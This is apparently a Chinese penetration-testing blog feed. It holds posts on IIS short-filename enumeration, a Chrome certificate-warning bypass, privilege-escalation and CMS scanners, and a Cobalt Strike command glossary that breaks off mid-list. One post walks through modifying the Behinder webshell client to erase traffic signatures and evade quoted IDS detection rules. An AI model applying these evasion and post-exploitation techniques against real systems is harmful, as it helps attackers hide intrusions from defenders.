class="hljs-comment">//www.xxx.com/abcde*~1*g**/a.aspx</span></code></pre><p>则代表扩展名中肯定存在g</p><p>按照上面的思路，继续猜解g后面的字符，直到后缀名中的3个字符都猜解完，就可以了。</p><p>以上介绍了怎么手工猜解，这个漏洞的意义何在：</p><ul><li>猜解后台地址</li><li>猜解敏感文件，例如备份的rar、zip、.bak、.SQL文件等</li><li>在某些情形下，甚至可以通过短文件名web直接下载对应的文件。比如下载备份SQL文件</li></ul><h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><p><strong>github：<a href="https://github.com/irsdl/iis-shortname-scanner/" target="_blank" rel="noopener">https://github.com/irsdl/iis-shortname-scanner/</a></strong></p><pre><code class="hljs mipsasm"><span class="hljs-keyword">java </span>-<span class="hljs-keyword">jar </span>iis_shortname_scanner.<span class="hljs-keyword">jar </span>&lt;url&gt;</code></pre><p><strong>github：<a href="https://github.com/lijiejie/IIS_shortname_Scanner/" target="_blank" rel="noopener">https://github.com/lijiejie/IIS_shortname_Scanner/</a></strong></p><pre><code class="hljs vim"><span class="hljs-keyword">python</span> iis_shortname_Scan.<span class="hljs-keyword">py</span> <span class="hljs-symbol">&lt;url&gt;</span></code></pre><h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><ul><li><p>关闭NTFS 8.3文件格式的支持。该功能默认是开启的，对于大多数用户来说无需开启</p></li><li><p>如果是虚拟主机空间用户,可采用以下修复方案：</p><ul><li>修改注册列表HKLM\SYSTEM\CurrentControlSet\Control\FileSystem\NtfsDisable8dot3NameCreation的值为1(此修改只能禁止NTFS8.3格式文件名创建,已经存在的文件的短文件名无法移除)</li><li>如果你的web环境不需要asp.net的支持你可以进入Internet 信息服务(IIS)管理器 — Web 服务扩展 - ASP.NET 选择禁止此功能</li><li>升级net framework 至4.0以上版本</li></ul></li><li><p>将web文件夹的内容拷贝到另一个位置，比如D:\www到D:\<a href="http://www.back，然后删除原文件夹D:\www，再重命名D:\www.back到D:\www。如果不重新复制，已经存在的短文件名则是不会消失的" target="_blank" rel="noopener">www.back，然后删除原文件夹D:\www，再重命名D:\www.back到D:\www。如果不重新复制，已经存在的短文件名则是不会消失的</a></p></li><li><p>对于虚拟主机空间用户，如果还不能彻底修复该问题，可以联系空间提供商协助修改。</p></li></ul><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span><a href="https://www.freebuf.com/news/197144.html" target="_blank" rel="noopener">https://www.freebuf.com/news/197144.html</a><a href="#fnref:1" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:2" class="footnote-text"><span><a href="https://www.freebuf.com/articles/4908.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/4908.html</a><a href="#fnref:2" rev="footnote" class="footnote-backref"> ↩</a></span></span></li></ol></div></section>]]></content>
    
    
    <categories>
      
      <category>安全工具</category>
      
      <category>扫描器</category>
      
    </categories>
    
    
    <tags>
      
      <tag>教程</tag>
      
      <tag>渗透</tag>
      
      <tag>POC</tag>
      
      <tag>IIS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Chrome证书问题</title>
    <link href="/2020/08/11/Chrome%E8%AF%81%E4%B9%A6%E9%97%AE%E9%A2%98/"/>
    <url>/2020/08/11/Chrome%E8%AF%81%E4%B9%A6%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<h3 id="Chrome您的连接不是私密连接解决办法"><a href="#Chrome您的连接不是私密连接解决办法" class="headerlink" title="Chrome您的连接不是私密连接解决办法"></a>Chrome您的连接不是私密连接解决办法</h3><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>您的连接不是私密连接<br>攻击者可能会试图从 x.x.x.x 窃取您的信息（例如：密码、通讯内容或信用卡信息）。了解详情<br>NET::ERR_CERT_INVALID</p><p>将您访问的部分网页的网址、有限的系统信息以及部分网页内容发送给 Google，以帮助我们提升 Chrome 的安全性。隐私权政策<br>x.x.x.x 通常会使用加密技术来保护您的信息。Google Chrome 此次尝试连接到 x.x.x.x 时，此网站发回了异常的错误凭据。这可能是因为有攻击者在试图冒充 x.x.x.x，或 Wi-Fi 登录屏幕中断了此次连接。请放心，您的信息仍然是安全的，因为 Google Chrome 尚未进行任何数据交换便停止了连接。</p><p>您目前无法访问 x.x.x.x，因为此网站发送了 Google Chrome 无法处理的杂乱凭据。网络错误和攻击通常是暂时的，因此，此网页稍后可能会恢复正常。</p><h2 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h2><p>解决办法就是在当前页面用键盘输入 <code>thisisunsafe</code> ，不是在地址栏输入，就直接敲键盘就行了，页面即会自动刷新进入网页。</p>]]></content>
    
    
    <categories>
      
      <category>教程</category>
      
      <category>浏览器</category>
      
    </categories>
    
    
    <tags>
      
      <tag>教程</tag>
      
      <tag>Chrome</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Windows提权辅助工具</title>
    <link href="/2020/08/03/WinEXP/"/>
    <url>/2020/08/03/WinEXP/</url>
    
    <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>通常在做测试的时候拿到低权限shell往往满足不了。可是在提权会带来一些困扰，不知道系统到底存在什么样的提权漏洞～～～  「 大佬除外」</p><p><strong><em>就此～ “他” 诞生了虽然并不是第一个有这种想法的人，但是想拥有自己的 “他” !</em></strong></p><p>此🦶📒可以分为命令行和Web服务版，满足你的多种需求🐶  –web版附带杀软查询</p><p>Web版在线地址：<a href="http://bugku.org/tools/winexp">http://bugku.org/tools/winexp</a></p><h2 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h2><pre><code class="hljs shell">Web版======python3 app.py命令版======python3 WinEXP.py &lt;保存systeminfo的文件&gt;</code></pre><h2 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h2><pre><code class="hljs erlang-repl">在文件根目录下启动! 在文件根目录下启动! 在文件根目录下启动!   python3 app.py</code></pre><ul><li><strong>粘贴systeminfo</strong></li></ul><p><img src="/img/wz/winexp/e1.png" srcset="/img/loading.gif" alt="e1"></p><ul><li><strong>粘贴tasklist /svc</strong></li></ul><p><img src="/img/wz/winexp/e2.png" srcset="/img/loading.gif" alt="e2"></p><ul><li><strong>后台输出</strong></li></ul><p><img src="/img/wz/winexp/e3.png" srcset="/img/loading.gif" alt="e3"></p><h2 id="Github"><a href="#Github" class="headerlink" title="Github"></a>Github</h2><section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span><a href="https://github.com/Ruiruigo/WinEXP" target="_blank" rel="noopener">https://github.com/Ruiruigo/WinEXP</a><a href="#fnref:1" rev="footnote" class="footnote-backref"> ↩</a></span></span></li></ol></div></section>]]></content>
    
    
    <categories>
      
      <category>安全工具</category>
      
      <category>扫描器</category>
      
    </categories>
    
    
    <tags>
      
      <tag>工具</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>魔改冰蝎</title>
    <link href="/2020/07/31/%E9%AD%94%E6%94%B9%E5%86%B0%E8%9D%8E/"/>
    <url>/2020/07/31/%E9%AD%94%E6%94%B9%E5%86%B0%E8%9D%8E/</url>
    
    <content type="html"><![CDATA[<h2 id="什么是冰蝎？"><a href="#什么是冰蝎？" class="headerlink" title="什么是冰蝎？"></a>什么是冰蝎？</h2><p>“冰蝎”是一个动态二进制加密网站管理客户端。在实战中，第一代webshell管理工具”菜刀”的流量特征非常明显，很容易就被安全设备检测到。基于流量加密的webshell变得越来越多，”冰蝎”在此应运而生。</p><p><img src="/img/wz/newbx/bx1.png" srcset="/img/loading.gif" alt="bx1"></p><p>“冰蝎”客户端基于JAVA，所以可以跨平台使用，最新版本为v2.0.1，兼容性较之前的版本有较大提升。主要功能为：基本信息、命令执行、虚拟终端、文件管理、Socks代理、反弹shell、数据库管理、自定义代码等，功能非常强大</p><h2 id="加密原理"><a href="#加密原理" class="headerlink" title="加密原理"></a>加密原理</h2><p>我们以PHP版本为例，”冰蝎”在服务端支持open_ssl时，使用AES加密算法，密钥长度16位，也可称为AES-16。此在软件及硬件(英特尔处理器的AES指令集包含六条指令)上都能快速地加解密，内存需求低，非常适合流量加密。</p><p>加密流程大致如下图所示：</p><p><img src="/img/wz/newbx/bx2.jpg" srcset="/img/loading.gif" alt="bx2"></p><p>首先客户端以Get形式发起带密码的请求。</p><p>服务端产生随机密钥，将密钥写入Session并将密钥返回客户端。</p><p>客户端获取密钥后，将payload用AES算法加密，用POST形式发送请求。</p><p>服务端收到请求，用Session中的密钥解密请求的Body部分，之后执行Payload，将直接结果返回到客户端。</p><p>客户端获取返回结果，显示到UI界面上。</p><p>我们看到在图中，”冰蝎”在执行Payload之后的返回，并没有显示加密，这点我们可以从自带的webshell中看出。</p><p><img src="/img/wz/newbx/bx3.png" srcset="/img/loading.gif" alt="bx3"></p><h2 id="通信过程"><a href="#通信过程" class="headerlink" title="通信过程"></a>通信过程</h2><p>我们用wireshark来抓包看下”冰蝎”通信过程：</p><p><img src="/img/wz/newbx/bx4.jpg" srcset="/img/loading.gif" alt="bx4"></p><p>从抓包结果上粗略来看，加密效果是不错的，全程基本没有可读的执行代码。</p><p>我们用服务端返回的密钥，对客户端发送的报文内容进行解密。</p><p>解密结果为如下代码：</p><p><img src="/img/wz/newbx/bx5.png" srcset="/img/loading.gif" alt="bx5"></p><p>我们发现核心内容只是一个简单的JSON格式的success的返回，但是会将结果使用AES包装一层加密，所以我们看到webshell中没有加密，而流量却是加密的。</p><h2 id="魔改准备"><a href="#魔改准备" class="headerlink" title="魔改准备"></a>魔改准备</h2><p>首先用JD-GUI等反编译工具，反编译JAR包获得源码。可以从中可以看到UI文件引入的包名看到，”冰蝎”使用了SWT框架作为UI。</p><p><img src="/img/wz/newbx/bx6.png" srcset="/img/loading.gif" alt="bx6"></p><p>既然这样我们直接用Eclipse安装WindowsBuilder，来直接创建SWT项目。</p><p><strong>安装WindowsBuilder</strong></p><p>在Eclipse的Marketplace里搜索WindowsBuilder，点击Install即可安装。</p><p><img src="/img/wz/newbx/bx7.png" srcset="/img/loading.gif" alt="bx7"></p><p>之后我们直接创建基于SWT项目，即可避免因swt包缺失导致的报错问题。</p><p><img src="/img/wz/newbx/bx8.png" srcset="/img/loading.gif" alt="bx8"></p><p>我们将反编译之后的源码和JAR包导入项目，在通过搜索源码和修复报错（会有一大波报错等待你修复，可以多种反编译工具对比结果来修改）等方式尝试将源码跑起来。</p><p><img src="/img/wz/newbx/bx9.png" srcset="/img/loading.gif" alt="bx9"></p><p>最终我们终于成功跑起来了反编译之后的代码。</p><p>可以看到项目结构比较简单清晰，主要逻辑都在net包下，Main.java为程序入口。这里简单介绍下各个模块代码的作用：</p><p><img src="/img/wz/newbx/bx10.png" srcset="/img/loading.gif" alt="bx10"></p><h2 id="特征擦除"><a href="#特征擦除" class="headerlink" title="特征擦除"></a>特征擦除</h2><p>经过对网上多篇对”冰蝎”特征的资料参考，总结出几条特征并将其特征给予修改擦除。以PHP版本为例，其他语言版本异曲同工。</p><h3 id="1-密钥交换时的URL参数"><a href="#1-密钥交换时的URL参数" class="headerlink" title="1.密钥交换时的URL参数"></a>1.密钥交换时的URL参数</h3><p>首当其冲的就是密钥交换时的参数，用GET请求方式，默认webshell的密码为pass，并且参数值为3位随机数字。</p><p><img src="/img/wz/newbx/bx11.png" srcset="/img/loading.gif" alt="bx11"></p><p>从webshell上看，参数值的随机数字并没有任何实际作用：</p><p><img src="/img/wz/newbx/bx12.png" srcset="/img/loading.gif" alt="bx12"></p><p>客户端代码上看也只是随机数：</p><p><img src="/img/wz/newbx/bx13.png" srcset="/img/loading.gif" alt="bx13"></p><p>我们来看下一般对此情况的检测规则：</p><p>.(php|jsp|asp|aspx)?(\w){1,10}=\d{2,3} HTTP/1.1</p><p>该规则可以匹配1-10位密码的webshell，并且参数值为2-3位的数字。</p><p><strong>修改思路：</strong></p><p>增加随机数量的随机参数和随机值（随机值不为全数字），并且密码参数不能固定为第一个。</p><p><strong>修改后的效果：</strong></p><p><img src="/img/wz/newbx/bx14.png" srcset="/img/loading.gif" alt="bx14"></p><h3 id="2-header中的Content-Type"><a href="#2-header中的Content-Type" class="headerlink" title="2.header中的Content-Type"></a>2.header中的Content-Type</h3><p>默认在header中的Content-type字段，在一般情况下的GET形式访问是没有该字段的，只有POST形式的访问才会有。但”冰蝎”不论是GET形式还是POST形式的访问均包含此字段。此处露出了较大破绽，而且该字段的大小写有点问题，所以基于这个规则基本可以秒杀。</p><p><img src="/img/wz/newbx/bx15.png" srcset="/img/loading.gif" alt="bx15"></p><p>我们来看下这块相关的的代码：</p><p><img src="/img/wz/newbx/bx16.png" srcset="/img/loading.gif" alt="bx16"></p><p>ShellService代表一个Shell服务，在其构造函数中31行判断了，如果类型是php则在header中加入Content-type头。但在35行的getKeyAndCookie向服务端发送GET请求获取密钥时，也将此header头带入其中，所以发送GET请求包时也会携带此参数。</p><p><strong>修改思路：</strong></p><p>GET形式访问时在header中去掉此字段，POST形式访问时将值改为Content-Type值改为”text/html;charset=utf-8″以规避安全检测（值也可以不改）。</p><p><strong>修改后的效果：</strong></p><p>GET请求：</p><p><img src="/img/wz/newbx/bx17.png" srcset="/img/loading.gif" alt="bx17"></p><p>POST请求：</p><p><img src="/img/wz/newbx/bx18.png" srcset="/img/loading.gif" alt="bx18"></p><h3 id="3-header中的User-Agent"><a href="#3-header中的User-Agent" class="headerlink" title="3.header中的User-Agent"></a>3.header中的User-Agent</h3><p>User-Agent是指用户代理，会包含浏览器和操作系统等信息标志。在”冰蝎”的早期版本存在User-Agent特例化问题，最新版本已经解决了这个问题。解决方案是：每个shell连接会从17个内置的UA里随机选择一个。</p><p><img src="/img/wz/newbx/bx19.png" srcset="/img/loading.gif" alt="bx19"></p><p>来看下这部分的JAVA代码：</p><p><img src="/img/wz/newbx/bx20.png" srcset="/img/loading.gif" alt="bx20"></p><p>可以看到是随机从常量Constants.userAgents中取了一个值。</p><p><img src="/img/wz/newbx/bx21.png" srcset="/img/loading.gif" alt="bx21"></p><p>这块的问题是UA包含的浏览器版本比较旧，比如：Chrome/14.0.835.163是2011年发布的版本，Firefox/6.0也是2011年的版本。这种浏览器基本很少人使用，所以特征较为明显，可以作为规则参考。</p><p><strong>修改思路：</strong></p><p>使用较新版本的常见浏览器UA来替换内置的旧的UA常量。</p><p><strong>修改后的效果：</strong></p><p>2020年发布的Firefox 75.0：</p><p><img src="/img/wz/newbx/bx22.png" srcset="/img/loading.gif" alt="bx22"></p><p>2019年11月发布的Chrome 78.0.3904.108：</p><p><img src="/img/wz/newbx/bx23.png" srcset="/img/loading.gif" alt="bx23"></p><h3 id="4-header中的Accept"><a href="#4-header中的Accept" class="headerlink" title="4.header中的Accept"></a>4.header中的Accept</h3><p>在请求header中的Accept字段默认会是一个比较奇怪的值，此值在GET形式和POST形式的请求中均存在。而在正常的浏览器或其他设备访问的报文中Accept的值不会是这样的，所以此处也可以作为一个强力有效的规则检测依据。</p><p>GET请求：</p><p><img src="/img/wz/newbx/bx24.png" srcset="/img/loading.gif" alt="bx24"></p><p>POST请求：</p><p><img src="/img/wz/newbx/bx25.png" srcset="/img/loading.gif" alt="bx25"></p><p>此处产生的原因是JAVA的HTTPURLConnection库（”冰蝎”使用的HTTP通信库）在没有设置Accept值时会自动设置该值作为默认值，而源码中默认并没有对Accept进行处理。</p><p><strong>修改思路：</strong></p><p>修改请求header中的Accept的值。</p><p><strong>修改后的效果：</strong></p><p>GET请求：</p><p><img src="/img/wz/newbx/bx26.png" srcset="/img/loading.gif" alt="bx26"></p><p>POST请求：</p><p><img src="/img/wz/newbx/bx27.png" srcset="/img/loading.gif" alt="bx27"></p><h3 id="5-二次密钥获取"><a href="#5-二次密钥获取" class="headerlink" title="5.二次密钥获取"></a>5.二次密钥获取</h3><p>在”冰蝎”的默认流量中，会有两次通过GET形式的请求获取密钥的过程，这点比较奇怪。</p><p>此处也可作为一个检测点。</p><p><img src="/img/wz/newbx/bx28.png" srcset="/img/loading.gif" alt="bx28"></p><p>我们来看下代码实现：</p><p><img src="/img/wz/newbx/bx29.png" srcset="/img/loading.gif" alt="bx29"></p><p>这一步是将密钥存入rawkey_1变量中。</p><p><img src="/img/wz/newbx/bx30.png" srcset="/img/loading.gif" alt="bx30"></p><p>再次获取的密钥存到rawkey_2变量中，之后rawkey_1和rawkey_2进行了异或操作，通过异或结果来判断，从而结束循环条件，最多尝试获取10次密钥。实话说这块代码没太看出来作用，实际是大部分情况2次就OK了，3次获取密钥的情况都不太多。个人感觉这块是为了校验获取到的密钥是否可用以及控制获取密钥的次数。</p><p><strong>修改思路：</strong></p><p>删掉多次获取密钥的过程，可以改成一次获取密钥。或者直接把密钥写到webshell里，省去获取密钥的过程。</p><p><strong>修改后的效果：</strong></p><p><img src="/img/wz/newbx/bx31.png" srcset="/img/loading.gif" alt="bx31"></p><h3 id="6-response中返回密钥"><a href="#6-response中返回密钥" class="headerlink" title="6.response中返回密钥"></a>6.response中返回密钥</h3><p>在获取密钥时，密钥返回是直接以16位字符的形式返回到客户端。这时会有比较大的破绽，我们来看下常用的检测规则：</p><p>\r\n\r\n[a-z0-9]{16}$</p><p>和</p><p>Content-Length: 16</p><p>检测内容是：以两个\r\n完整换行加上16位字母小写+数字组合为结尾，再配合Content-Length:16 为规则一起检测。</p><p><img src="/img/wz/newbx/bx32.png" srcset="/img/loading.gif" alt="bx32"></p><p>我们来看下客户端代码对于密钥的匹配规则：</p><p><img src="/img/wz/newbx/bx33.png" srcset="/img/loading.gif" alt="bx33"></p><p>源码只匹配了16位的字母a-f大小写+数字，hah~ 这是因为啥呢？？？</p><p>原因在”冰蝎”默认自带的webshell里：</p><p><img src="/img/wz/newbx/bx34.png" srcset="/img/loading.gif" alt="bx34"></p><p>因为webshell生成的密码算法为md5，md5输出结果显示是16进制，所以只有0-9a-f。</p><p><strong>修改思路：</strong></p><p>GET形式访问时，可以加入一些混淆的返回内容，或者将密钥变型。</p><p><strong>修改后的效果：</strong></p><p>可以先从视觉效果上隐藏起来：</p><p><img src="/img/wz/newbx/bx35.png" srcset="/img/loading.gif" alt="bx35"></p><p>流量侧：</p><p><img src="/img/wz/newbx/bx36.png" srcset="/img/loading.gif" alt="bx36"></p><p>这里只是简单的加了一些内容作为演示，实战时可以根据情况混淆。</p><h3 id="7-header中的Cookie"><a href="#7-header中的Cookie" class="headerlink" title="7.header中的Cookie"></a>7.header中的Cookie</h3><p>因为”冰蝎”默认自带的webshell中的key在将密钥返回客户端后，会将密钥保存在Session中。而SessionId在第一次客户端请求时作为Cookie发送给了客户端，所以Cookie也是作为我们一个重要检查点。</p><p><img src="/img/wz/newbx/bx37.png" srcset="/img/loading.gif" alt="bx37"></p><p>Cookie中的问题是”path=/”这部分。在访问服务器时，服务端将Cookie以Set-Cookie的response头中的形式返回，其中Path是该Cookie的应用路径。</p><p>举个例子：</p><p>Cookie1; Path=/</p><p>Cookie2; Path=/admin/</p><p>当浏览器访问网站 “/” 路径时，只会携带Cookie1。当访问 “/admin/”路径时，会同时携带Cookie1和Cookie2。</p><p>在正常浏览器访问下，path是不会作为Cookie本身的一部分发送到服务端的。</p><p>来看下客户端代码：</p><p><img src="/img/wz/newbx/bx38.png" srcset="/img/loading.gif" alt="bx38"></p><p>此处将服务端返回的Cookie所有字符都在客户端存储起来，当客户端发送请求时全部将这些字符作为Cookie发送出去。</p><p><strong>修改思路：</strong></p><p>将发送请求中Cookie的Path字段去掉。</p><p><strong>修改后的效果：</strong></p><p><img src="/img/wz/newbx/bx39.png" srcset="/img/loading.gif" alt="bx39"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span><a href="http://www.mamicode.com/info-detail-2986949.html" target="_blank" rel="noopener">http://www.mamicode.com/info-detail-2986949.html</a><a href="#fnref:1" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:2" class="footnote-text"><span><a href="https://www.freebuf.com/tag/冰蝎" target="_blank" rel="noopener">https://www.freebuf.com/tag/冰蝎</a><a href="#fnref:2" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:3" class="footnote-text"><span><a href="https://www.anquanke.com/post/id/212271" target="_blank" rel="noopener">https://www.anquanke.com/post/id/212271</a> （作者）<a href="#fnref:3" rev="footnote" class="footnote-backref"> ↩</a></span></span></li></ol></div></section>]]></content>
    
    
    <categories>
      
      <category>教程</category>
      
      <category>工具</category>
      
    </categories>
    
    
    <tags>
      
      <tag>教程</tag>
      
      <tag>渗透</tag>
      
      <tag>webshell</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CMS扫描器</title>
    <link href="/2020/07/31/cmsScan/"/>
    <url>/2020/07/31/cmsScan/</url>
    
    <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p><strong>cmsScan基于特征匹配达到识别CMS的效果</strong>    — 字典库🐂🍺 cmsScan就🐂🍺</p><p>​    cmsScanWEB 正在赶来的路上 🐎 ～</p><h2 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h2><pre><code class="hljs shell">python3 cmsScan.py -u &lt;URL&gt; -f &lt;字典文件&gt; -t &lt;线程，默认150线程&gt;=======-u : 支持域名和IP http://127.0.0.1  #末尾去除 ‘/’-f : 字典文件 格式： /pic/logo-tw.png|用友U8|133ddfebd5e24804f97feb4e2ff9574b-t : 线程默认150</code></pre><h2 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h2><p><img src="/img/wz/cmsScan/cmsScan.png" srcset="/img/loading.gif" alt="cmsScan"></p><p><img src="/img/wz/cmsScan/cmsScan-2.png" srcset="/img/loading.gif" alt="cmsScan-2"></p><h2 id="Github"><a href="#Github" class="headerlink" title="Github"></a>Github</h2><section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span><a href="https://github.com/Ruiruigo/cmsScan" target="_blank" rel="noopener">https://github.com/Ruiruigo/cmsScan</a><a href="#fnref:1" rev="footnote" class="footnote-backref"> ↩</a></span></span></li></ol></div></section>]]></content>
    
    
    <categories>
      
      <category>安全工具</category>
      
      <category>扫描器</category>
      
    </categories>
    
    
    <tags>
      
      <tag>工具</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CobaltStrike</title>
    <link href="/2020/07/27/CobaltStrike/"/>
    <url>/2020/07/27/CobaltStrike/</url>
    
    <content type="html"><![CDATA[<p><img src="/img/wz/cs/CobaltStrike.jpg" srcset="/img/loading.gif" alt="CobaltStrike"></p><h2 id="界面翻译"><a href="#界面翻译" class="headerlink" title="界面翻译"></a>界面翻译</h2><h3 id="导航栏"><a href="#导航栏" class="headerlink" title="导航栏"></a>导航栏</h3><ul><li><strong>Cobalt Strike</strong></li></ul><pre><code class="hljs routeros">New<span class="hljs-built_in"> Connection</span>  #新的连接(支持连接多个服务器端)Preferences #偏好设置(设置Cobal Strike界面、控制台、以及输出报告样式、TeamServer连接记录等)Visualization #窗口视图模式(展示输出结果的形式)VPN Interfaces #VPN接入Listenrs #监听器(创建Listener)Script Manager #脚本管理Close #关闭</code></pre><ul><li><strong>View</strong></li></ul><pre><code class="hljs 1c">Applications  <span class="hljs-meta">#应用(显示受害者机器的应用信息)</span>Credentials  <span class="hljs-meta">#凭证(通过hashdump或Mimikatz抓取过的密码都会储存在这里)</span>Downloads   <span class="hljs-meta">#下载文件</span>Event <span class="hljs-built_in">Log</span>   <span class="hljs-meta">#事件日志(主机上线记录以及团队协作聊天记录)</span>Keystrokes    <span class="hljs-meta">#键盘记录</span>Proxy Pivots  <span class="hljs-meta">#代理模块</span>Screenshots      <span class="hljs-meta">#截图</span>Script Console   <span class="hljs-meta">#脚本控制台(可以加载各种脚本，增强功能https:<span class="hljs-comment">//github.com/rsmudge/cortana-scripts)</span></span>Targets  <span class="hljs-meta">#显示目标主机</span>Web <span class="hljs-built_in">Log</span>          <span class="hljs-meta">#Web日志</span></code></pre><ul><li><strong>Attacks</strong></li></ul><pre><code class="hljs crmsh"><span class="hljs-comment">#Packages</span>--------HTML Application<span class="hljs-comment">#生成恶意的HTA木马文件</span><span class="hljs-keyword">MS</span> <span class="hljs-title">Office</span> Macro<span class="hljs-comment">#生成office宏病毒文件</span>Payload Generator <span class="hljs-comment">#生成各种语言版本的payload</span>USB/CD AutoPlay <span class="hljs-comment">#生成利用自动播放运行的木马文件</span>Windows Dropper <span class="hljs-comment">#捆绑器，能够对文档类进行捆绑</span>Windows Executable   <span class="hljs-comment">#生成可执行Payload</span>Windows Executable(S) <span class="hljs-comment">#把包含payload,Stageless生成可执行文件(包含多数功能)</span><span class="hljs-comment">#Web Drive-by</span>--------Manage <span class="hljs-comment">#对开启的web服务进行管理</span><span class="hljs-keyword">Clone</span> <span class="hljs-title">Site</span> <span class="hljs-comment">#克隆网站(可记录受害者提交的数据)</span>Host File <span class="hljs-comment">#提供Web以供下载某文件</span>Scripted Web Delivery <span class="hljs-comment">#提供Web服务，便于下载和执行PowerShell Payload</span>Signed Applet Attack <span class="hljs-comment">#启动一个Web服务以提供自签名Java Applet的运行环境</span>Smart Applet Attack <span class="hljs-comment">#自动检测Java版本并利用已知的exploits绕过security</span>System Profiler <span class="hljs-comment">#用来获取一些系统信息，比如系统版本，Flash版本，浏览器版本等</span></code></pre><ul><li><strong>Reporting</strong></li></ul><pre><code class="hljs yaml"><span class="hljs-number">0</span><span class="hljs-string">.</span> <span class="hljs-string">Activity</span> <span class="hljs-string">report</span> <span class="hljs-comment">#活动报告</span><span class="hljs-number">1</span><span class="hljs-string">.</span> <span class="hljs-string">Hosts</span> <span class="hljs-string">report</span> <span class="hljs-comment">#主机报告</span><span class="hljs-number">2</span><span class="hljs-string">.</span> <span class="hljs-string">Indicators</span> <span class="hljs-string">of</span> <span class="hljs-string">Compromise</span> <span class="hljs-comment">#威胁报告</span><span class="hljs-number">3</span><span class="hljs-string">.</span> <span class="hljs-string">Sessions</span> <span class="hljs-string">report</span> <span class="hljs-comment">#会话报告</span><span class="hljs-number">4</span><span class="hljs-string">.</span> <span class="hljs-string">Social</span> <span class="hljs-string">engineering</span> <span class="hljs-string">report</span> <span class="hljs-comment">#社会工程学报告</span><span class="hljs-number">5</span><span class="hljs-string">.</span> <span class="hljs-string">Tactics,</span> <span class="hljs-string">Techniques,</span> <span class="hljs-string">and</span> <span class="hljs-string">Procedures</span> <span class="hljs-comment">#策略、技巧和程序  </span><span class="hljs-string">Reset</span> <span class="hljs-string">Data</span> <span class="hljs-comment">#重置数据</span><span class="hljs-string">Export</span> <span class="hljs-string">Data</span> <span class="hljs-comment">#导出数据</span></code></pre><h3 id="右键参数"><a href="#右键参数" class="headerlink" title="右键参数"></a>右键参数</h3><ul><li><strong>interact</strong></li></ul><pre><code class="hljs plain">进入Beacon</code></pre><ul><li><strong>Access</strong></li></ul><pre><code class="hljs gauss">Dump Hashes <span class="hljs-meta">#获取hash</span>Elevate <span class="hljs-meta">#提权</span>Golden Ticket <span class="hljs-meta">#生成黄金票据注入当前会话</span><span class="hljs-built_in">Make</span> <span class="hljs-built_in">token</span> <span class="hljs-meta">#凭证转换</span><span class="hljs-keyword">Run</span> Mimikatz <span class="hljs-meta">#运行 Mimikatz </span>Spawn As <span class="hljs-meta">#用其他用户生成Cobalt Strike侦听器</span></code></pre><ul><li><strong>Explore</strong></li></ul><pre><code class="hljs mipsasm"><span class="hljs-keyword">Browser </span>Pivot <span class="hljs-comment">#劫持目标浏览器进程</span>Desktop(VNC) <span class="hljs-comment">#桌面交互</span>File <span class="hljs-keyword">Browser </span><span class="hljs-comment">#文件浏览器</span>Net View <span class="hljs-comment">#命令Net View</span>Port <span class="hljs-keyword">Scan </span><span class="hljs-comment">#端口扫描</span>Process List <span class="hljs-comment">#进程列表</span><span class="hljs-keyword">Screenshot </span><span class="hljs-comment">#截图</span></code></pre><ul><li><strong>Pivoting</strong></li></ul><pre><code class="hljs routeros">SOCKS<span class="hljs-built_in"> Server </span>#代理服务Listener #反向端口转发Deploy VPN #部署VPN</code></pre><ul><li><strong>Spawn</strong></li></ul><pre><code class="hljs gcode">外部监听器<span class="hljs-comment">(如指派给MSF，获取meterpreter权限)</span></code></pre><ul><li><strong>Session</strong></li></ul><pre><code class="hljs autoit">Note <span class="hljs-meta">#备注</span>Remove <span class="hljs-meta">#删除</span><span class="hljs-built_in">Sleep</span> <span class="hljs-meta">#指定被控端休眠时间，默认60秒一次回传，让被控端每10秒来下载一次任务。</span><span class="hljs-keyword">Exit</span> <span class="hljs-meta">#退出</span></code></pre><h2 id="Cobalt-Strike-Beacon-命令详情"><a href="#Cobalt-Strike-Beacon-命令详情" class="headerlink" title="Cobalt Strike Beacon 命令详情"></a>Cobalt Strike Beacon 命令详情</h2><pre><code class="hljs routeros">beacon&gt; helpBeacon Commands===============    Command                   Description    -------                   -----------    argue                     进程参数欺骗    blockdlls                 阻止子进程加载非Microsoft DLL    browserpivot              注入受害者浏览器进程      bypassuac                 绕过UAC提升权限    cancel                    取消正在进行的下载    cd                        切换目录    checkin                   强制让被控端回连一次    clear                     清除beacon内部的任务队列    connect                   Connect <span class="hljs-keyword">to</span> a Beacon<span class="hljs-built_in"> peer </span>over TCP    covertvpn                 部署Covert VPN客户端    cp                        复制文件    dcsync                    从DC中提取密码哈希    desktop                   远程桌面(VNC)    dllinject                 反射DLL注入进程    dllload                   使用LoadLibrary将DLL加载到进程中    download                  下载文件    downloads                 列出正在进行的文件下载    drives                    列出目标盘符    elevate                   使用exp    execute                   